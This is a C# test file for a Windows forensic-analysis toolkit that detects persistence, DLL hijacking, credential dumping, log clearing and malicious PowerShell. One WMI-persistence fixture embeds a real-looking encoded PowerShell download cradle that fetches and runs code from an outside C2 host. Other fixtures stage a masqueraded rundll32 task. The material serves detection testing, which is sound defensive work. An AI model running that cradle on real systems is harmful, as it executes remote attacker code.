using System;
using System.Linq;

using Camel.Environments;
using Camel.Workflows;
using Camel.Workflows.Models;

namespace Camel.Tests.Workflows;

public class WindowsAnalysisWorkflowTests : TestsRuntime
{
    public WindowsAnalysisWorkflowTests()
    {
        var sshconfig = LoadConfigFile("sshtestappsettings.json");
        sshenv = AuditEnvironment.CreateFromConfig(sshconfig);
        api = new CamelApi(sshenv, sshconfig);
        workflow = new WindowsAnalysisWorkflow(api);
    }

    [Fact]
    public async Task CanExtractKeyArtifacts()
    {
        // SYSTEM/SOFTWARE/SAM/SECURITY hives from the mounted Windows image (no NTUSER.DAT or Amcache.hve here).
        var r = await workflow.ExtractKeyArtifactsAsync($"{Modern}/Windows/System32/config");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.NotEmpty(r.Result.AllEntries);
        Assert.Equal(16, r.Result.Artifacts.Length); // one bucket per Key Registry Artifact category

        KeyArtifact Get(string name) => Assert.Single(r.Result!.Artifacts, a => a.Name == name);

        // Artifacts that live in the SYSTEM/SOFTWARE hives are present in this mount.
        Assert.NotEmpty(Get("Shimcache").Entries);
        Assert.NotEmpty(Get("Services").Entries);
        Assert.NotEmpty(Get("Timezone").Entries);

        // Each bucket's entries genuinely match its key-path fragment.
        Assert.All(Get("Shimcache").Entries, e => Assert.Contains("appcompatcache", e.KeyPath!, StringComparison.OrdinalIgnoreCase));
        Assert.All(Get("Timezone").Entries, e => Assert.Contains("timezoneinformation", e.KeyPath!, StringComparison.OrdinalIgnoreCase));
        Assert.All(Get("Services").Entries, e => Assert.Contains(@"\services\", e.KeyPath!, StringComparison.OrdinalIgnoreCase));

        // Buckets only ever contain entries with a key path.
        Assert.All(r.Result.Artifacts, a => Assert.All(a.Entries, e => Assert.False(string.IsNullOrEmpty(e.KeyPath))));
    }

    [Fact]
    public async Task ExtractKeyArtifactsIsEmptyForNoHives()
    {
        // RECmd is lenient — a directory with no hives parses successfully but yields nothing, so the report
        // is well-formed (all 16 buckets present) but every bucket is empty.
        var r = await workflow.ExtractKeyArtifactsAsync("/mnt/does_not_exist/config");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.Empty(r.Result.AllEntries);
        Assert.Equal(16, r.Result.Artifacts.Length);
        Assert.All(r.Result.Artifacts, a => Assert.Empty(a.Entries));
    }

    [Fact]
    public async Task CanGetKnownExecutables()
    {
        var r = await workflow.GetKnownExecutablesAsync($"{Modern}/Windows/System32/config/SYSTEM");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.NotEmpty(r.Result);
        // Shimcache is an inventory of executables Windows has seen on disk.
        Assert.Contains(r.Result, e => e.Path.Contains(".exe", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public async Task GetKnownExecutablesIsEmptyForMissingHive()
    {
        // AppCompatCacheParser exits cleanly but produces no output for a missing hive, so the workflow
        // succeeds with an empty inventory rather than failing.
        var r = await workflow.GetKnownExecutablesAsync("/mnt/does_not_exist/SYSTEM");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.Empty(r.Result);
    }

    [Fact]
    public async Task CanGetExecutedBinaries()
    {
        var r = await workflow.GetExecutedBinariesAsync($"{Modern}/Windows/appcompat/Programs/Amcache.hve");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.NotEmpty(r.Result);
        // Amcache's value is the SHA-1 + path of each binary (VirusTotal pivot).
        Assert.Contains(r.Result, e => !string.IsNullOrEmpty(e.SHA1) && !string.IsNullOrEmpty(e.FullPath));
    }

    [Fact]
    public async Task GetExecutedBinariesIsEmptyForMissingHive()
    {
        // AmcacheParser exits cleanly but produces no output for a missing hive, so the workflow succeeds
        // with an empty list rather than failing.
        var r = await workflow.GetExecutedBinariesAsync("/mnt/does_not_exist/Amcache.hve");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.Empty(r.Result);
    }

    [Fact]
    public async Task CanFindPersistenceMechanisms()
    {
        const string config = $"{Modern}/Windows/System32/config";
        var r = await workflow.FindPersistenceMechanismsAsync(
            softwareHive: $"{config}/SOFTWARE",
            systemHive: $"{config}/SYSTEM",
            ntuserHive: $"{Modern}/Users/fredr/NTUSER.DAT");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.NotEmpty(r.Result.AllEntries);
        Assert.Equal(5, r.Result.Mechanisms.Length); // one bucket per persistence category

        PersistenceMechanism Get(string cat) => Assert.Single(r.Result!.Mechanisms, m => m.Category == cat);

        // Run keys: the SOFTWARE hive's HKLM Run holds SecurityHealth on this image.
        var runKeys = Get(WindowsAnalysisWorkflow.CatRunKeys);
        Assert.NotEmpty(runKeys.Entries);
        Assert.Contains(runKeys.Entries, e => e.Name == "SecurityHealth");

        // Services were enumerated from the SYSTEM hive (svc CSV), each with a backing image path.
        var services = Get(WindowsAnalysisWorkflow.CatServices);
        Assert.NotEmpty(services.Entries);
        Assert.Contains(services.Entries, e => !string.IsNullOrEmpty(e.Command));

        // Suspicion bookkeeping is consistent: flagged entries carry reasons, unflagged ones don't.
        Assert.All(r.Result.SuspiciousEntries, e => { Assert.True(e.Suspicious); Assert.NotEmpty(e.Reasons); });
        Assert.All(r.Result.AllEntries.Where(e => !e.Suspicious), e => Assert.Empty(e.Reasons));
    }

    [Fact]
    public async Task FindPersistenceMechanismsIsEmptyForMissingHives()
    {
        // rip.pl is lenient — it exits cleanly on a missing hive and yields no findings, so the workflow
        // succeeds with a well-formed but empty report (all 5 categories present, none populated).
        var r = await workflow.FindPersistenceMechanismsAsync("/mnt/does_not_exist/SOFTWARE", "/mnt/does_not_exist/SYSTEM");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.Equal(5, r.Result.Mechanisms.Length);
        Assert.Empty(r.Result.AllEntries);
        Assert.All(r.Result.Mechanisms, m => Assert.Empty(m.Entries));
    }

    [Fact]
    public async Task FlagsMaliciousScheduledTaskFromXml()
    {
        // Stage the real SRL "Collect Background Statistics" task (action: C:\Windows\Temp\1.bat) as an on-disk
        // UTF-16 Task XML — exactly how Windows stores it — so the parser must transcode it as it does for real
        // tasks. Registry TaskCache can't recover this command; the XML action parser can, so it must be flagged.
        const string dir = "/tmp/camel_tasks";
        const string xml =
            "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n" +
            "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n" +
            "  <RegistrationInfo><Author>shieldbase\\spsql</Author><URI>\\Collect Background Statistics</URI></RegistrationInfo>\n" +
            "  <Actions Context=\"Author\"><Exec><Command>C:\\Windows\\Temp\\1.bat</Command></Exec></Actions>\n" +
            "</Task>\n";
        var b64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(xml));
        sshenv.ExecuteCommand("rm", $"-rf {dir}", out _, false);
        sshenv.ExecuteCommand("mkdir", $"-p {dir}", out _, false);
        sshenv.ExecuteCommand("echo", $"{b64} | base64 -d | iconv -f UTF-8 -t UTF-16 > '{dir}/Collect Background Statistics'", out _, false);

        const string cfg = $"{Modern}/Windows/System32/config";
        var r = await workflow.FindPersistenceMechanismsAsync($"{cfg}/SOFTWARE", $"{cfg}/SYSTEM", tasksDirectory: dir);

        Assert.True(r.IsSuccess, r.Message);
        var tasks = Assert.Single(r.Result!.Mechanisms, m => m.Category == WindowsAnalysisWorkflow.CatScheduledTasks);
        var evil = Assert.Single(tasks.Entries, e => e.Name == @"\Collect Background Statistics");
        Assert.Equal(@"C:\Windows\Temp\1.bat", evil.Command); // Exec action recovered from the XML
        Assert.True(evil.Suspicious);
        Assert.Contains(evil.Reasons, reason => reason.Contains("suspicious location"));
        Assert.Contains(r.Result.SuspiciousEntries, e => e.Name == @"\Collect Background Statistics");

        sshenv.ExecuteCommand("rm", $"-rf {dir}", out _, false);
    }

    [Fact]
    public async Task FlagsMasqueradedLolbinViaLolbas()
    {
        // A scheduled task launching rundll32.exe from C:\ProgramData (a LOLBin from a non-canonical path). The
        // path isn't in the default suspicious-location list, so the ONLY thing that can flag it is the LOLBAS
        // masquerade check — isolating that feature.
        const string dir = "/tmp/camel_tasks_lolbin";
        const string xml =
            "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n" +
            "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n" +
            "  <RegistrationInfo><URI>\\Updater</URI></RegistrationInfo>\n" +
            "  <Actions Context=\"Author\"><Exec><Command>C:\\ProgramData\\rundll32.exe</Command><Arguments>evil.dll,Start</Arguments></Exec></Actions>\n" +
            "</Task>\n";
        var b64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(xml));
        sshenv.ExecuteCommand("rm", $"-rf {dir}", out _, false);
        sshenv.ExecuteCommand("mkdir", $"-p {dir}", out _, false);
        sshenv.ExecuteCommand("echo", $"{b64} | base64 -d | iconv -f UTF-8 -t UTF-16 > '{dir}/Updater'", out _, false);

        const string cfg = $"{Modern}/Windows/System32/config";
        var r = await workflow.FindPersistenceMechanismsAsync($"{cfg}/SOFTWARE", $"{cfg}/SYSTEM", tasksDirectory: dir);

        Assert.True(r.IsSuccess, r.Message);
        var evil = Assert.Single(r.Result!.SuspiciousEntries, e => e.Name == @"\Updater");
        Assert.Contains(evil.Reasons, reason => reason.Contains("non-canonical path"));

        sshenv.ExecuteCommand("rm", $"-rf {dir}", out _, false);
    }

    [Fact]
    public async Task FindsMaliciousWmiConsumer()
    {
        // Stage a synthetic OBJECTS.DATA carrying the real SRL "SystemPerformanceMonitor" subscription strings in
        // repository order (filter -> encoded-PowerShell command -> consumer name -> consumer ref -> filter ref),
        // plus a benign allow-listed subscription. strings extraction + parsing must surface only the malicious one.
        const string dir = "/tmp/camel_wmi";
        const string content =
            "PerformanceMonitor\n" +
            "powershell -W Hidden -nop -noni -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA\n" +
            "SystemPerformanceMonitor\n" +
            "CommandLineEventConsumer.Name=\"SystemPerformanceMonitor\"\n" +
            "__EventFilter.Name=\"PerformanceMonitor\"\n" +
            "SCM Event Log Filter\n" +
            "NTEventLogEventConsumer.Name=\"SCM Event Log Consumer\"\n" +
            "__EventFilter.Name=\"SCM Event Log Filter\"\n";
        var b64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(content));
        sshenv.ExecuteCommand("rm", $"-rf {dir}", out _, false);
        sshenv.ExecuteCommand("mkdir", $"-p {dir}", out _, false);
        sshenv.ExecuteCommand("echo", $"{b64} | base64 -d > {dir}/OBJECTS.DATA", out _, false);

        var r = await workflow.FindWmiPersistenceAsync($"{dir}/OBJECTS.DATA");

        Assert.True(r.IsSuccess, r.Message);
        var evil = Assert.Single(r.Result!.SuspiciousConsumers);
        Assert.Equal("SystemPerformanceMonitor", evil.Name);
        Assert.Equal("CommandLineEventConsumer", evil.Type);
        Assert.Equal("PerformanceMonitor", evil.FilterName);                       // recovered binding (trigger)
        Assert.Contains("downloadstring", evil.DecodedCommand ?? "");              // decoded encoded-PowerShell payload
        Assert.Contains("squirreldirectory.com", evil.DecodedCommand ?? "");       // revealed C2
        Assert.Contains(evil.Reasons, x => x.Contains("remote-download"));

        sshenv.ExecuteCommand("rm", $"-rf {dir}", out _, false);
    }

    [Fact]
    public async Task FindsDllHijacking()
    {
        // Build a synthetic volume: a Windows-root DLL that shadows a System32 DLL with different bytes
        // (search-order hijack), a same-size-but-different shadow (exercises the hash path), a DLL in a transient
        // location, and two benign cases that must NOT flag: a non-shadowing root DLL and a byte-identical shadow.
        const string v = "/tmp/camel_dllhj";
        void W(string rel, string content) => sshenv.ExecuteCommand("bash", $"-c \"printf '%s' '{content}' > '{v}/{rel}'\"", out _, false);
        sshenv.ExecuteCommand("rm", $"-rf {v}", out _, false);
        sshenv.ExecuteCommand("mkdir", $"-p {v}/Windows/System32 {v}/Windows/Temp", out _, false);
        W("Windows/System32/ntshrui.dll", "GENUINE-SYSTEM32-NTSHRUI");   // genuine
        W("Windows/ntshrui.dll", "EVIL");                                 // shadow, different size -> hijack
        W("Windows/System32/samesize.dll", "AAAA");
        W("Windows/samesize.dll", "BBBB");                                // shadow, same size diff bytes -> hijack (hash path)
        W("Windows/System32/identical.dll", "SAME");
        W("Windows/identical.dll", "SAME");                               // byte-identical copy -> benign
        W("Windows/twain_32.dll", "no-system32-counterpart");             // non-shadow root DLL -> benign
        W("Windows/Temp/payload.dll", "dropped");                         // transient-location DLL -> flag

        var r = await workflow.FindDllHijackingAsync(v);

        Assert.True(r.IsSuccess, r.Message);
        var names = r.Result!.Findings.Select(f => f.Name).ToArray();
        Assert.Contains("ntshrui.dll", names);
        Assert.Contains("samesize.dll", names);
        Assert.Contains("payload.dll", names);
        Assert.DoesNotContain("identical.dll", names);  // byte-identical -> not a hijack
        Assert.DoesNotContain("twain_32.dll", names);   // doesn't shadow System32 -> not flagged

        var shadow = Assert.Single(r.Result.Findings, f => f.Name == "ntshrui.dll");
        Assert.Equal("Search-order shadow", shadow.Kind);
        Assert.Equal($"{v}/Windows/System32/ntshrui.dll", shadow.ShadowedSystemDll);
        Assert.Equal("Transient-location DLL", Assert.Single(r.Result.Findings, f => f.Name == "payload.dll").Kind);

        sshenv.ExecuteCommand("rm", $"-rf {v}", out _, false);
    }

    [Fact]
    public async Task DetectsCredentialDumping()
    {
        // Synthetic volume: legitimate copies (live AD DB, dcpromo template, live + RegBack hives) plus an
        // attacker IFM dump (ntds.dit + a hive in C:\temp), an LSASS dump, and a Kerberos ticket. Only the
        // out-of-place artifacts must flag — and lsass.exe must NOT be mistaken for a dump.
        const string v = "/tmp/camel_creddump";
        void T(string rel)
        {
            var full = $"{v}/{rel}";
            int slash = full.LastIndexOf('/');
            sshenv.ExecuteCommand("mkdir", $"-p '{full[..slash]}'", out _, false);
            sshenv.ExecuteCommand("bash", $"-c \"printf 'x' > '{full}'\"", out _, false);
        }
        sshenv.ExecuteCommand("rm", $"-rf {v}", out _, false);
        T("Windows/NTDS/ntds.dit");                 // canonical AD DB -> benign
        T("Windows/System32/ntds.dit");             // dcpromo template -> benign
        T("Windows/System32/config/SAM");           // live hive -> benign
        T("Windows/System32/config/RegBack/SYSTEM");// RegBack -> benign
        T("Windows/System32/lsass.exe");            // the real process -> must NOT flag (not a .dmp)
        T("temp/Active Directory/ntds.dit");        // exfiltrated AD DB -> NTDS
        T("temp/registry/SYSTEM");                  // exported hive -> Registry hive dump
        T("Users/evil/lsass.dmp");                  // LSASS memory dump
        T("Users/evil/admin.kirbi");                // exported Kerberos ticket

        var r = await workflow.DetectCredentialDumpingAsync(v);

        Assert.True(r.IsSuccess, r.Message);
        var byKind = r.Result!.Findings.ToLookup(f => f.Kind);
        Assert.Equal($"{v}/temp/Active Directory/ntds.dit", Assert.Single(byKind[WindowsAnalysisWorkflow.CredNtds]).Path);
        Assert.Equal($"{v}/temp/registry/SYSTEM", Assert.Single(byKind[WindowsAnalysisWorkflow.CredHive]).Path);
        Assert.Equal($"{v}/Users/evil/lsass.dmp", Assert.Single(byKind[WindowsAnalysisWorkflow.CredLsass]).Path);
        Assert.Equal($"{v}/Users/evil/admin.kirbi", Assert.Single(byKind[WindowsAnalysisWorkflow.CredKirbi]).Path);
        Assert.Equal(4, r.Result.Findings.Length);  // none of the benign/canonical copies, and not lsass.exe
        Assert.DoesNotContain(r.Result.Findings, f => f.Name.Equals("lsass.exe", StringComparison.OrdinalIgnoreCase));

        sshenv.ExecuteCommand("rm", $"-rf {v}", out _, false);
    }

    [Fact]
    public async Task DetectCredentialDumpingIsCleanForBenignImage()
    {
        // The clean modern workstation image has its hives only in the canonical locations and no AD database at
        // all, so it must not flag an exfiltrated ntds.dit (the highest-severity credential-dump artifact).
        var r = await workflow.DetectCredentialDumpingAsync(Modern);

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.DoesNotContain(r.Result.Findings, f => f.Kind == WindowsAnalysisWorkflow.CredNtds);
    }

    [Fact]
    public async Task FindDllHijackingIsCleanForBenignImage()
    {
        // The clean modern image has no Windows-root shadows and no DLLs in the transient dirs scanned (user
        // AppData\Local\Temp DLLs are deliberately not scanned), so a real volume yields zero false positives.
        var r = await workflow.FindDllHijackingAsync(Modern);

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.Empty(r.Result.Findings);
    }

    [Fact]
    public async Task CanAnalyzeLogons()
    {
        // rd-01's Security.evtx holds the full spread of authentication events from the intrusion.
        var r = await workflow.AnalyzeLogonsAsync("/mnt/srl/Windows/System32/winevt/Logs/Security.evtx");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotEmpty(r.Result!.Logons);
        Assert.NotEmpty(r.Result.ByLogonType);

        // The lateral-movement subsets are populated on this compromised host.
        Assert.NotEmpty(r.Result.FailedLogons);
        Assert.All(r.Result.FailedLogons, l => Assert.False(l.Success));
        Assert.NotEmpty(r.Result.NetworkLogons);
        Assert.NotEmpty(r.Result.ExplicitCredentialLogons);

        // RDP logons are classified by type and parsed with their origin (target user + source IP from the payload).
        Assert.NotEmpty(r.Result.RemoteDesktopLogons);
        Assert.All(r.Result.RemoteDesktopLogons, l => { Assert.Equal(10, l.LogonType); Assert.Equal("RemoteInteractive (RDP)", l.LogonTypeName); });
        Assert.Contains(r.Result.RemoteDesktopLogons, l => l.TargetUser == "tdungan" && l.SourceIp == "192.168.30.10");
    }

    [Fact]
    public async Task CanHuntLateralMovement()
    {
        const string logs = "/mnt/srl/Windows/System32/winevt/Logs";
        var r = await workflow.HuntLateralMovementAsync($"{logs}/Security.evtx", $"{logs}/System.evtx");

        Assert.True(r.IsSuccess, r.Message);

        // Remote logons are inbound network/RDP from real remote sources.
        Assert.NotEmpty(r.Result!.RemoteLogons);
        Assert.All(r.Result.RemoteLogons, l => { Assert.True(l.LogonType is 3 or 10); Assert.False(string.IsNullOrWhiteSpace(l.SourceIp)); });

        // Explicit-credential (runas / pass-the-hash) events present.
        Assert.NotEmpty(r.Result.ExplicitCredentialLogons);

        // Admin-share access is restricted to C$/ADMIN$ and carries the accessing account.
        Assert.NotEmpty(r.Result.AdminShareAccess);
        Assert.All(r.Result.AdminShareAccess, s => Assert.Matches(@"(?i)\\(C|ADMIN)\$", s.ShareName ?? ""));
        Assert.Contains(r.Result.AdminShareAccess, s => !string.IsNullOrEmpty(s.Account));

        // Service installs are enumerated from BOTH logs — the System log's 7045 adds the attacker's masquerade
        // service ("Microsoft Advanced API"), which a Security-log-only view would miss.
        Assert.NotEmpty(r.Result.ServiceInstalls);
        Assert.Contains(r.Result.ServiceInstalls, s => (s.ServiceName ?? "").Contains("Advanced API", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public async Task DetectsLogClearing()
    {
        const string logs = "/mnt/srl/Windows/System32/winevt/Logs";
        var r = await workflow.DetectLogClearingAsync($"{logs}/Security.evtx", $"{logs}/System.evtx");

        Assert.True(r.IsSuccess, r.Message);
        Assert.True(r.Result!.Detected);
        // The Security audit log was cleared (1102) by an Administrator account.
        Assert.Contains(r.Result.Events, e => e.EventId == 1102 && e.ClearedLog == "Security"
            && (e.User ?? "").Contains("Administrator", StringComparison.OrdinalIgnoreCase));
        // The System log records its own clear (104), naming the wiped channel.
        Assert.Contains(r.Result.Events, e => e.EventId == 104 && e.ClearedLog == "System");
    }

    [Fact]
    public async Task CanAnalyzePowerShell()
    {
        var r = await workflow.AnalyzePowerShellAsync(
            "/mnt/srl/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotEmpty(r.Result!.ScriptBlocks);
        Assert.NotEmpty(r.Result.SuspiciousScriptBlocks);
        // The intrusion's download cradle (squirreldirectory.com C2) is surfaced and flagged from a script block.
        Assert.Contains(r.Result.SuspiciousScriptBlocks, s => (s.ScriptText ?? "").Contains("squirreldirectory", StringComparison.OrdinalIgnoreCase));
        Assert.All(r.Result.SuspiciousScriptBlocks, s => Assert.NotEmpty(s.Reasons));
    }

    const string Modern = "/mnt/ewf";

    AuditEnvironment sshenv;
    CamelApi api;
    WindowsAnalysisWorkflow workflow;
}
